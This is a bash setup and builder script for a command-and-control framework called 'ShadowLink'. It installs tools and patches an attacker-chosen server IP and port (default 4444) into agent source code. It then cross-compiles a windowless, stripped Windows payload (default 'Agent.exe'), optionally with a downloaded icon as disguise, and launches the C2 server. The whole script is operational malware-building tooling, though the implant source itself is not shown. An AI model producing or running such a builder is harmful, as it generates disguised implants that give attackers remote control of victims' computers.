#!/bin/bash

# Ensure we are in the script's directory
cd "$(dirname "$0")"

# ==========================================
# SHADOWLINK C2 FRAMEWORK
# Universal Setup & Configuration Script
# ==========================================

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
GRAY='\033[0;90m'
NC='\033[0m'

clear

# ==========================================
# New Professional ShadowLink Logo
# ==========================================

echo -e "${MAGENTA}"

echo "   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗     ██╗███╗   ██╗██╗  ██╗"
echo "   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║     ██║████╗  ██║██║ ██╔╝"
echo "   ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║     ██║██╔██╗ ██║█████╔╝ "
echo "   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██║     ██║██║╚██╗██║██╔═██╗ "
echo "   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝███████╗██║██║ ╚████║██║  ██╗"
echo "   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝"

echo -e "${NC}"

echo -e "${CYAN}           ShadowLink C2 Framework Setup${NC}"
echo -e "${GRAY}        Automated Configuration & Builder${NC}"
echo ""

# ------------------------------------------
# 1. Check Dependencies
# ------------------------------------------

echo -e "${BLUE}[1/4] Checking System Dependencies...${NC}"

# Check Python3
if ! command -v python3 &> /dev/null; then

    echo -e "${RED}[ERROR] python3 not found.${NC}"
    exit 1

fi

# Check PIP
if ! command -v pip &> /dev/null; then

    echo -e "${YELLOW}[*] Installing pip...${NC}"

    sudo apt-get update &> /dev/null
    sudo apt-get install -y python3-pip &> /dev/null

fi

# Install Python Requirements
echo -e "${CYAN}[*] Installing Python dependencies...${NC}"

pip install flask flask-socketio eventlet &> /dev/null


# Check MinGW
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null || ! command -v i686-w64-mingw32-g++ &> /dev/null; then

    echo -e "${YELLOW}[*] Installing MinGW-w64 toolchain...${NC}"

    sudo apt-get update &> /dev/null
    sudo apt-get install -y mingw-w64 &> /dev/null

else

    echo -e "${GREEN}[OK] MinGW compilers detected.${NC}"

fi


# ------------------------------------------
# 2. Configuration
# ------------------------------------------

echo -e "\n${BLUE}[2/4] Configuration${NC}"

DEFAULT_IP=$(hostname -I | cut -d' ' -f1)
[ -z "$DEFAULT_IP" ] && DEFAULT_IP="127.0.0.1"

read -p "   C2 Server IP [$DEFAULT_IP]: " C2_IP_INPUT
C2_IP=${C2_IP_INPUT:-$DEFAULT_IP}

read -p "   Agent Port [4444]: " C2_PORT_INPUT
C2_PORT=${C2_PORT_INPUT:-4444}

read -p "   Web Panel Port [5001]: " WEB_PORT_INPUT
WEB_PORT=${WEB_PORT_INPUT:-5001}

read -p "   Payload Name [Agent.exe]: " PAYLOAD_INPUT
PAYLOAD_NAME=${PAYLOAD_INPUT:-Agent.exe}

[[ ! "$PAYLOAD_NAME" == *.exe ]] && PAYLOAD_NAME="$PAYLOAD_NAME.exe"


# Icon input
echo -e "   Icon file path (.ico) or URL:"
read -p "   > " ICON_PATH


# Download icon if URL
if [[ "$ICON_PATH" == http* ]]; then

    echo -e "${CYAN}[*] Downloading icon...${NC}"

    curl -s -L -o temp_icon.ico "$ICON_PATH"

    if [ -s temp_icon.ico ]; then
        ICON_PATH="temp_icon.ico"
    else
        echo -e "${RED}[WARNING] Icon download failed.${NC}"
        ICON_PATH=""
    fi

fi


echo -e "${CYAN}[*] Applying configuration...${NC}"


# Patch Agent
sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$C2_IP\"/" src/main.cpp
sed -i "s/#define C2_PORT .*/#define C2_PORT $C2_PORT/" src/main.cpp


# Patch Server
sed -i "s/LPORT = [0-9]*/LPORT = $C2_PORT/" c2_server.py
sed -i "s/LPORT_WEB = [0-9]*/LPORT_WEB = $WEB_PORT/" c2_server.py


# ------------------------------------------
# 3. Compile Payload
# ------------------------------------------

echo -e "\n${BLUE}[3/4] Building Agent Payload...${NC}"

RESOURCE_OBJ=""

if [ -n "$ICON_PATH" ] && [ -f "$ICON_PATH" ]; then

    echo "MAINICON ICON \"$ICON_PATH\"" > resource.rc

    if i686-w64-mingw32-windres resource.rc -O coff -o resource.res; then
        RESOURCE_OBJ="resource.res"
    fi

fi


i686-w64-mingw32-g++ \
-O3 \
-s \
-static \
-mwindows \
src/main.cpp \
$RESOURCE_OBJ \
-o "$PAYLOAD_NAME" \
-lws2_32 \
-lwininet \
-ladvapi32 \
-lshell32 \
-liphlpapi


rm -f resource.rc resource.res temp_icon.ico


if [ -f "$PAYLOAD_NAME" ]; then

    echo -e "${GREEN}[SUCCESS] Payload generated:${NC}"
    echo -e "${CYAN}$(pwd)/$PAYLOAD_NAME${NC}"

else

    echo -e "${RED}[FAILED] Compilation failed.${NC}"
    exit 1

fi


# ------------------------------------------
# 4. Finish
# ------------------------------------------

echo -e "\n${GREEN}[4/4] Setup Complete${NC}"

echo -e "${YELLOW}Web Panel:${NC} http://localhost:$WEB_PORT"
echo -e "${YELLOW}Payload:${NC}   $PAYLOAD_NAME"


echo ""
read -p "Start C2 Server now? (y/n): " START_NOW

if [[ "$START_NOW" =~ ^[Yy]$ ]]; then

    fuser -k $WEB_PORT/tcp &> /dev/null
    fuser -k $C2_PORT/tcp &> /dev/null

    python3 c2_server.py

else

    echo "Run manually:"
    echo "python3 c2_server.py"

fi
